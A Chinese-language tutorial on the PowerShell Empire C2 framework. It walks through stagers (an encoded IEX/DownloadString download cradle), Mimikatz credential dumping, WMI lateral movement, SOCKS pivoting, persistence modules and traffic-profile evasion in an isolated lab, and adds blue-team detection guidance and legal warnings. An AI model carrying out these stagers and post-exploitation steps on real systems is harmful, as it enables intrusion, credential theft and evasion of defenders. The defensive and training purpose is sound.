# PowerShell Empire（PowerShell / Python 后渗透代理框架）

> **一句话**：一个「用 PowerShell（或 Python）写 implant」的 C2 框架——agent 不需要 `powershell.exe`，可替换为 Python/DotNet 实现，模块化支持键盘记录、凭据提取、横向与持久化。
> **分类**：后渗透 / 命令与控制（Command and Control）｜ **Kali 包**：`powershell-empire`（命令 `powershell-empire`、`starkiller-start`）｜ **官方文档**：<https://github.com/BC-SECURITY/Empire> ｜ 文档站：<https://bc-security.gitbook.io/empire-wiki/>

---

## 1. 它解决什么问题

拿到 Windows 落脚点后，会面临一组工程问题：

- **怎么维持访问**（agent 掉线就完蛋）；
- **怎么下发后续指令**（不停重新投递 payload 不现实）；
- **怎么组织后渗透动作**（枚举、凭据、提权、横向）；
- **怎么降低噪声**（不要每次都上传 exe）。

Empire 把这些问题打包成 **agent + listener + stager + 模块** 的框架：

| 需求 | Empire 的回答 |
|------|---------------|
| 可交互的植入体 | agent（PowerShell / Python / C# / IronPython） |
| 通信通道 | listener（HTTP/HTTPS/OneDrive/Dropbox 等） |
| 二次投递 | stager（一行命令/PowerShell 单行载入） |
| 后渗透动作 | 200+ 模块（凭据、枚举、提权、横向、持久化） |
| 图形化操作 | Starkiller（Web UI，端口 1337） |

与同类对比：

| 工具 | 定位 | 差异 |
|------|------|------|
| **Empire** | **框架**（agent 管理 + 模块生态） | 模块丰富、历史悠久；HTTP profile 可定制 |
| **Metasploit** | 框架（exploit + payload） | 强在打点，C2 能力弱；见 [`../06-漏洞利用/metasploit-framework.md`](../06-漏洞利用/metasploit-framework.md) |
| **Sliver** | 框架（Go implant，现代 C2） | 更隐蔽（mTLS/HTTP/DNS）、跨平台更好；见 [`../12-基础设施与C2/sliver.md`](../12-基础设施与C2/sliver.md) |
| **Cobalt Strike** | 商业 C2 | 隐蔽与生态最强，价格高昂 |
| **Mimikatz** | 单点工具（凭据提取） | Empire 里也有对应模块，见 [`mimikatz.md`](mimikatz.md) |

**Empire 的独特价值**：**PowerShell 无文件（fileless）落地**——agent 可以完全活在内存里，不写盘；以及成熟的 **HTTP profile**（让流量看起来像正常 Web 请求）。

---

## 2. 工作原理

```
┌────────────── Kali ──────────────┐        ┌──────── 目标 Windows ────────┐
│ Empire Server（Python 应用）      │        │  stager：一条 PS 单行命令      │
│  ├─ listener（HTTP/HTTPS/...）   │◄───────┤   IEX (New-Object Net.WebClient)│
│  │    :8443  ← agent 回连        │  HTTPS │    .DownloadString(...)       │
│  ├─ REST API（:1337 /api）       │        │        │                      │
│  └─ 数据库（MySQL/SQLite）        │        │        ▼                      │
│         │                        │        │  agent 在内存中运行            │
│         ▼                        │◄───────┤   每 N 秒回连取指令            │
│ Starkiller（Web UI :1337）        │  心跳  │   执行后回传结果                │
└──────────────────────────────────┘        └──────────────────────────────┘
```

关键概念：

- **Listener**：监听器，定义 agent 用什么协议回连。常用 `http`/`https`（也可挂到 CDN/域名前置）。
- **Stager**：把 agent 拉起来的一小段代码。Empire 的经典形式是 **PowerShell 单行命令**（`powershell -noP -sta -w 1 -enc <base64>`）或 `launcher`（bat/vbs/宏/hta）。
- **Agent**：植入体。Empire 的特色是**语言可选**（`powershell`、`python`、`csharp`、`ironpython`），并支持 **无文件**（不落地 exe）。
- **Module**：后渗透动作。Empire 的模块以「PowerShell 脚本片段 / .NET 程序集」形式在内存中执行。
- **怎么「不进 powershell.exe」**：Empire 支持把 agent 编译成 .NET 程序集并用 `Add-Type`/反射加载，或让 `wmic`/`mshta`/`rundll32`/`regsvr32` 作为宿主，从而规避「父进程是 powershell.exe」这类规则。

### 2.1 为什么它容易被检测（先讲清楚）

Empire 的经典形式在现代 EDR 下面临强检测：

| 特征 | 检测点 |
|------|--------|
| 长 base64 的 `powershell -enc` | 命令行审计（4688/Sysmon 1）、AMSI、脚本块日志（4104） |
| `IEX (New-Object Net.WebClient).DownloadString(...)` | 脚本块日志 + AMSI 特征 |
| `Add-Type` 编译 C# | .NET 编译行为、`csc.exe` 进程 |
| 固定心跳间隔 | 网络流量行为分析 |
| 默认 HTTP profile | 请求头/URI 模式特征（Empire 的默认 profile 已被大量 IOC 收录） |

**结论**：Empire 适合**学习 C2 架构与授权环境中的对抗演练**；生产红队场景更常用 Sliver 或 CS，并且必须**自定义 profile**。对蓝队而言，Empire 是最经典的「检测能力试金石」。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install powershell-empire
command -v powershell-empire starkiller-start
```

```console
root@kali:~# powershell-empire -h
usage: empire.py [-h] {server,setup} ...

positional arguments:
  {server,setup}
    server        Launch Empire Server
    setup         Setup the data directories for Empire

options:
  -h, --help            show this help message and exit
```

启动服务端：

```bash
# 首次：初始化数据目录
sudo powershell-empire setup

# 启动服务（会同时起 REST API 与 Web UI）
sudo powershell-empire server
```

```console
[*] Empire starting up...
[*] Running in api mode
[*] Initializing database...
[*] Started server process
[*] Uvicorn running on http://0.0.0.0:1337
```

图形界面：

```bash
sudo starkiller-start
```

```console
[*] Web UI: http://127.0.0.1:1337
[i] You might need to refresh your browser once it opens

 Default credentials:
   user: empireadmin
   password: password123
```

> **默认口令必须第一时间修改**（`empireadmin / password123`）。`starkiller` 命令已被 Kali 标记为废弃，请用 `starkiller-start`。

命令行客户端（Empire 6.x 提供 `powershell-empire client`）：

```bash
sudo powershell-empire client
```

```console
(Empire) > listeners
(Empire) > agents
```

> Kali 页面的 `-h` 输出只列出 `server` 与 `setup` 两个子命令；**部分版本仍提供 `client`**。以实际 `powershell-empire -h` 为准——若没有 `client`，就用 Starkiller Web UI。

停止：

```bash
sudo starkiller-stop          # 停止 Web UI 与 Empire 服务
```

---

## 4. 核心参数详解

### 4.1 命令行 / 服务端

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `powershell-empire setup` | 初始化数据目录与数据库 | 首次必做 |
| `powershell-empire server` | 启动服务端（REST API + Web UI） | 默认 `1337` 端口 |
| `powershell-empire client` | 命令行客户端 | 视版本可用；否则用 Starkiller |
| `starkiller-start` / `-stop` | 启动/停止 Web UI 与服务 | 默认 `empireadmin/password123` |
| 配置目录 | `/usr/share/powershell-empire/`（含 `empire/server`、profiles、modules） | 自定义 profile 在这里 |

### 4.2 Starkiller / Empire 客户端里的核心操作

| 操作（Web UI 术语） | 对应命令 | 说明 |
|---------------------|----------|------|
| **Listeners → Create** | `uselistener http` | 定义通信通道（HTTP/HTTPS，可自定义 profile） |
| `info` / `options` | 查看必填项 | 必设 `Host`、`Port`、`Name` |
| **Stagers → Create** | `usestager windows/launcher_bat` 等 | 生成投递代码（PS 单行、bat、hta、宏、msi…） |
| **Agents** 列表 | `agents` | 查看在线 agent |
| **Interact** | `interact <name>` | 进入 agent 会话 |
| **Run Module** | `usemodule <path>` + `execute` | 执行后渗透模块 |
| **Profiles** | —— | HTTP profile：定制 URI、请求头、User-Agent（**降低流量特征的关键**） |
| **Credentials** | `creds` | 模块抓到的凭据汇总（含明文/hash） |
| **Plugins** | `plugins` | 扩展（如 `csharpserver` 托管 .NET 程序集） |

### 4.3 常用模块路径（真实模块体系）

| 目标 | 模块路径 |
|------|----------|
| 用户/组/主机枚举 | `powershell/situational_awareness/network/powerview/*`（PowerView 系列） |
| 进程/服务/软件 | `powershell/situational_awareness/host/*` |
| 凭据提取 | `powershell/credentials/mimikatz/logonpasswords`、`powershell/credentials/mimikatz/dcsync` |
| 本地提权检查 | `powershell/privesc/powerup/allchecks`（PowerUp） |
| 提权利用（示例） | `powershell/privesc/*` |
| 横向执行 | `powershell/lateral_movement/invoke_wmi`、`invoke_psremoting`、`invoke_smbexec`、`invoke_psexec` |
| 持久化 | `powershell/persistence/elevated/registry`、`schtasks`、`wmi` |
| 键盘记录 | `powershell/collection/keylogger` |
| 屏幕/剪贴板 | `powershell/collection/screenshot`、`powershell/collection/clipboard_monitor` |
| 反检测 | `powershell/management/amsi`、`powershell/management/spawn`、`powershell/management/psinject` |
| 隧道/代理 | `powershell/management/socks`（在 agent 上开 SOCKS） |
| 主机信息收集批次 | `powershell/situational_awareness/host/winenum` |

> 模块清单随版本变化，**以 Web UI 里的搜索/列表为准**。Empire 的模块还支持「按 agent 语言过滤」——Python agent 不能用 PowerShell 模块。

---

## 5. 实战演练

> **环境声明**：全部在**自建 Windows 靶机**（未打补丁的评测虚拟机，**Host-Only 网络**，且**关闭或隔离**以免影响真实网络）中进行。示例：Kali `192.168.56.5`，Windows 靶机 `192.168.56.50`，域 `contoso.local`。
> **绝对禁止对未授权主机投递 agent**：agent 是后门，投递行为本身即构成非法控制。

### 场景 1：起一个 listener 并拿到第一个 agent

**① 启动服务与 Web UI，改掉默认口令**

```bash
sudo powershell-empire setup
sudo powershell-empire server &
sudo starkiller-start
```

```console
[*] Web UI: http://127.0.0.1:1337
 Default credentials:
   user: empireadmin
   password: password123
```

浏览器打开 `http://127.0.0.1:1337`，用默认口令登录 → **立刻在设置里改密码**。

**② 创建 listener**（Web UI：`Listeners → Create → http`）

```console
Name:      http-listener
Host:      http://192.168.56.5      ← agent 回连地址（必须靶机可达）
Port:      8443
BindIP:    0.0.0.0
Launcher:  powershell
```

```console
[*] Listener 'http-listener' started on 0.0.0.0:8443
```

**③ 生成 stager**（Web UI：`Stagers → Create → windows/launcher_bat` 或 `launcher_hta`）

```powershell
powershell -noP -sta -w 1 -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYA... )
```

**④ 在靶机上执行 stager**（授权靶机）

```console
C:\Users\jdoe> powershell -noP -sta -w 1 -enc SQBFAFgA...
```

在 Web UI 的 `Agents` 里出现：

```console
Name        Listener        Language      Username              Process
H7K2QLP3    http-listener   powershell    CONTOSO\jdoe          powershell (4432)
```

**解读**：`Language: powershell` 说明是 PS agent；`Process` 是承载它的进程（**这就是检测点**：`powershell.exe` 作为父进程执行 `-enc`）。

**⑤ 交互与第一个模块**

```console
(Empire: agents) > interact H7K2QLP3
(Empire: H7K2QLP3) > whoami
CONTOSO\jdoe
(Empire: H7K2QLP3) > shell whoami /priv
```

或通过 Web UI：选中 agent → `Interact` → 底部输入框执行。

### 场景 2：后渗透模块链（枚举 → 提权检查 → 凭据 → 横向）

```console
# ① 主机与域信息收集（PowerView 系列）
(Empire: H7K2QLP3) > usemodule situational_awareness/network/powerview/get_user
(Empire: H7K2QLP3) > execute
```
```console
[+] Domain Users
samaccountname   description        pwdlastset          lastlogon
jdoe             Helpdesk           2024-05-11 08:20:33 2024-09-15 07:41:02
svc_backup       Backup Service     2023-11-05 14:02:11
```

```console
# ② 找域管登录过的主机（高价值目标）
(Empire: H7K2QLP3) > usemodule situational_awareness/network/powerview/find_localadmin_access
(Empire: H7K2QLP3) > execute
```

```console
# ③ 本地提权检查（PowerUp）
(Empire: H7K2QLP3) > usemodule privesc/powerup/allchecks
(Empire: H7K2QLP3) > execute
```
```console
[*] Running Invoke-AllChecks
[+] Modifiable Services
[+] Unquoted Service Paths
    Name: BackupSvc  Path: C:\Program Files\Backup Tool\svc.exe --run
```
**解读**：`Unquoted Service Paths` + 可写目录是最经典的本地提权路径（把 `Program.exe` 放进 `C:\` 就会被以服务账号身份执行）。

```console
# ④ 凭据提取（需管理员/SYSTEM —— 先提权）
(Empire: H7K2QLP3) > usemodule credentials/mimikatz/logonpasswords
(Empire: H7K2QLP3) > execute
```
```console
[+] Credentials found:
  Username : CONTOSO\jdoe
  Domain   : CONTOSO
  Password : Summer2024!
  Hash     : 31d6cfe0d16ae931b73c59d7e0c089c0
```
**解读**：Empire 会把结果自动汇总到 `Credentials` 视图，并**可以设置账号为「已控」**，后续模块可自动复用。这一步等价于 [`mimikatz.md`](mimikatz.md) 的 `sekurlsa::logonpasswords`。

```console
# ⑤ 横向移动到另一台主机（WMI 通道）
(Empire: H7K2QLP3) > usemodule lateral_movement/invoke_wmi
(Empire: H7K2QLP3) > set ComputerName WEB01.contoso.local
(Empire: H7K2QLP3) > set Listener http-listener
(Empire: H7K2QLP3) > set CredID 1
(Empire: H7K2QLP3) > execute
```
```console
[*] Sending agent to WEB01.contoso.local via WMI
[+] New agent checked in: W8P1ZQ4R (CONTOSO\Administrator @ WEB01)
```
**解读**：`set CredID 1` 用的是刚抓到的凭据（Empire 的凭据库编号）。**这就是 C2 框架的价值**：凭据 → 横向 → 新 agent，全在框架内闭环。

```console
# ⑥ 在 agent 上开 SOCKS，把内网交给你熟悉的工具
(Empire: H7K2QLP3) > usemodule management/socks
(Empire: H7K2QLP3) > set Port 1080
(Empire: H7K2QLP3) > execute
```
```bash
# 在 Kali 上用 proxychains 打内网
proxychains4 -q nxc smb 10.10.20.5 -u jdoe -p 'Summer2024!' --shares
```
见 [`proxychains4.md`](proxychains4.md)。

### 场景 3：自定义 profile，把「教科书式特征」改掉

默认 HTTP profile 的特征已被大量 IOC 收录，**必须定制**（Web UI：`Listeners → Profiles`，或直接改服务端 profile 文件）：

```json
{
  "Name": "Custom-Web",
  "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
  "URIs": ["/login/oauth2/callback", "/api/v2/session", "/assets/js/app.js"],
  "Headers": {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*"
  },
  "PostBody": ""
}
```

创建 listener 时选择该 profile：

```console
Name:      https-listener
Host:      https://192.168.56.5
Port:      443
CertPath:  /path/to/cert.pem
Profile:   Custom-Web
```

**解读**：profile 的目标是让**请求看起来像目标网络里的正常业务流量**（URI 像 API、UA 像浏览器）。但注意：**这只改变静态特征**，行为特征（心跳周期、同一 URI 的周期性 POST、数据体积模式）仍然可被检测。

**注意事项（授权测试中的纪律）**：

- 每次投放 agent 前确认授权范围与时间窗；
- 大动作（`invoke_wmi` 横向、`dcsync`）在授权书里通常需要单独明示；
- 测试结束后**逐一清理** agent、持久化项、计划任务、服务。

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Listener '<name>' started on 0.0.0.0:<port>` | 监听器就绪 | 生成 stager 投递 |
| Agent 出现在列表中，`Language: powershell` | PS agent 上线 | `interact` |
| `New agent checked in: <name>` | 横向成功（或新主机上线） | 立即 `interact` 并快速枚举 |
| `Credentials` 视图出现明文/hash | 凭据到手 | 复用（横向模块 `set CredID`） |
| `[+] Modifiable Services` / `Unquoted Service Paths` | 提权线索 | 按线索利用（授权环境） |
| Agent 变灰/消失 | 掉线：进程被杀、网络断、EDR 阻断 | 换 stager/宿主进程/通道 |
| `AMSI` 相关报错或模块失败 | AMSI 拦截 | `management/amsi` 模块（会留下强特征）；或换宿主 |
| `Unable to connect to listener` | 靶机无法回连 | 检查 Host 是否靶机可达、出站是否放行 |
| 模块报 `Cannot find module` | 模块名写错/语言不匹配 | Web UI 里搜索模块；确认 agent 语言 |

**成功判据**：Agent 列表中出现在线节点，且 `interact` 后能用 `whoami` 拿到预期身份。

---

## 7. 与其他工具配合

```
① 拿到初始执行（钓鱼 stager / 已有 shell / 计划任务）
        │
② Empire listener + stager ──► agent 上线
        │
├─► 枚举（PowerView 系列）           ──► 用户/组/主机/会话
├─► 提权检查（powerup/allchecks）    ──► 提权线索
├─► 凭据（mimikatz 模块）            ──► 明文/hash ──► Empire 凭据库
├─► 横向（invoke_wmi / psremoting）  ──► 新 agent
├─► 持久化（registry / schtasks / wmi）
└─► management/socks                 ──► proxychains4 ──► nxc / impacket / evil-winrm
```

- 现代替代（更隐蔽、跨平台）：[`../12-基础设施与C2/sliver.md`](../12-基础设施与C2/sliver.md)
- 凭据提取细节：[`mimikatz.md`](mimikatz.md) ｜ 批量凭据验证：[`netexec.md`](netexec.md)
- 攻击路径：[`bloodhound.md`](bloodhound.md) ｜ 隧道：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)
- Payload 生成与框架对比：[`../06-漏洞利用/metasploit-framework.md`](../06-漏洞利用/metasploit-framework.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `powershell-empire client` 不存在 | Kali 打包只暴露 `server`/`setup` | 用 Starkiller Web UI（`:1337`） |
| Web UI 打不开 | 服务未起/端口占用 | `sudo powershell-empire server`；`ss -lntp \| grep 1337` |
| 忘记 Web UI 口令 | 默认 `empireadmin/password123` 已改且丢失 | 用 `powershell-empire setup` 相关重置流程，或直接改数据库（谨慎） |
| Agent 不上线 | Host 不可达 / 出站被拦 / stager 被删 | 靶机上先 `Test-NetConnection <kali> -Port 8443`；换 Host/端口 |
| Stager 一执行就被杀 | Defender/AMSI/EDR | 说明防护有效；授权测试中记录；换宿主进程与 profile |
| `powershell.exe` 被禁用/受限 | 应用控制（WDAC/AppLocker）、PS 约束语言模式 | 换 `csharp`/`python` agent，或用 `mshta`/`rundll32` 宿主（均有强特征） |
| 模块执行无输出 | AMSI 拦截 / PS 语言模式限制 | 看 agent 的 `Last Result`；换等价混淆模块 |
| 中文乱码 | 编码 | 在模块里设 `$OutputEncoding`；或改用 Web UI 查看 |
| 掉线频繁 | 心跳超时 / EDR 杀进程 | 调心跳参数；`spawn` 到更稳的进程；换 listener |
| 端口 1337/8443 冲突 | 被占用 | 换端口；`ss -lntp` 排查 |
| 流量被 IDS 拦 | 默认 profile 特征 | **自定义 profile**（URI/UA/Headers） |
| 数据库错误 | MySQL 未起 / 初始化未完成 | `sudo systemctl start mysql`；重跑 `powershell-empire setup` |
| 服务重启后 agent 全掉 | listener 配置丢失 | 用 `setup` 保证持久化；确认服务配置 |

---

## 9. 防御视角（蓝队）

Empire 是最经典的「检测能力试金石」——**它的攻击链几乎每一环都有成熟的检测方法**。

| 攻击环节 | 检测信号 | 缓解措施 |
|----------|----------|----------|
| **`powershell.exe -enc <长 base64>`** | 4688/Sysmon 1 命令行含 `-enc`/`-EncodedCommand`/`-w hidden`/`-nop`；命令行长度异常 | **脚本块日志（4104）**、**PowerShell 日志（4103/4104）**、AMSI、WDAC/AppLocker 限制 PS 执行、Constrained Language Mode |
| **`IEX + DownloadString`（无文件）** | 4104 中出现 `Net.WebClient`/`DownloadString`/`IEX` | AMSI + 脚本块日志 + **约束语言模式禁用 `Add-Type`/`New-Object`** |
| **`Add-Type` 编译 C#** | `csc.exe` 进程、`%TEMP%` 下的编译产物 | WDAC、EDR 行为规则 |
| **宿主进程异常** | `mshta.exe`/`rundll32.exe`/`regsvr32.exe`/`wmic.exe` 发起网络连接 | EDR 规则：这些进程**不应**发起出站 HTTP；Office → 子进程链告警 |
| **Agent 回连（HTTPS）** | 周期性长时间 HTTPS 会话；同一 URI 的规律性 POST；JA3 指纹 | 出站白名单、TLS 检查、NetFlow 行为基线、JA3/JA4 情报 |
| **Mimikatz 模块** | LSASS 句柄访问（Sysmon 10）、4663 | Credential Guard / RunAsPPL（见 [`mimikatz.md`](mimikatz.md)） |
| **DCSync 模块** | 事件 4662、DRSUAPI | 收紧复制权限、监控 4662 |
| **WMI/PSRemoting 横向** | 4688 父进程 `WmiPrvSE.exe`；WinRM 91/168；5985 入站 | 限制 WMI/WinRM 来源、网络分段、EDR 父进程规则 |
| **注册表/schtasks/WMI 持久化** | 4698（计划任务创建）、13 事件（注册表写入）、7045（服务） | 监控持久化点（Autoruns 基线）、限制普通用户写任务/服务 |
| **键盘记录 / 截屏** | 罕见的键盘钩子 API（`SetWindowsHookEx`）、GDI 截屏调用 | EDR 行为规则、最小权限 |
| **Socks 代理模块** | 单主机大量内网连接 | 内网分段、东西向审计 |
| **默认 profile IOC** | 已知 URI/UA/Header 组合 | 威胁情报匹配、代理层规则 |

**蓝队演练建议**：在隔离网络中部署一台 Windows 靶机 + Empire，**验证你的 SIEM 是否能检出以下 5 个关键点**：① `-enc` 命令行；② 4104 脚本块；③ 宿主进程出站连接；④ LSASS 访问；⑤ 计划任务/注册表持久化。**能全部检出，才算具备了基础检测能力。**

---

## 10. 参考

- Empire 官方仓库：<https://github.com/BC-SECURITY/Empire>
- Empire 文档（模块列表与用法）：<https://bc-security.gitbook.io/empire-wiki/>
- Starkiller（Web UI）：<https://github.com/BC-SECURITY/Starkiller>
- Kali 工具页：<https://www.kali.org/tools/powershell-empire/>
- MITRE ATT&CK · PowerShell（T1059.001）、无文件执行（T1027）、计划任务（T1053.005）
- 本地命令：`powershell-empire -h`、`powershell-empire server -h`、`starkiller-start --help`

## ⚠️ 法律与伦理

Empire 的 agent 是**后门程序**。对未授权系统投递 agent、建立 C2 通道，可能触犯《刑法》第 285 条（非法侵入计算机信息系统、非法获取计算机信息系统数据、**非法控制计算机信息系统**）、第 286 条（破坏计算机信息系统），以及《网络安全法》第 27 条。《刑法》第 285 条对「非法控制计算机信息系统」有明确的刑期规定，**这类行为属于重罪范畴**。

本教程仅用于：
1. **书面授权的红队/渗透测试演练**（授权书须明确允许「C2 植入与持久化」）；
2. **CTF 竞赛**；
3. **完全隔离的自建实验室**（Windows 靶机 + Empire 的攻防演练）。

测试结束必须：清理所有 agent、计划任务、注册表项、服务与投放文件；停止 listener 与服务；对提取的凭据加密存储、限时销毁；报告中不含可直接复用的通道信息。
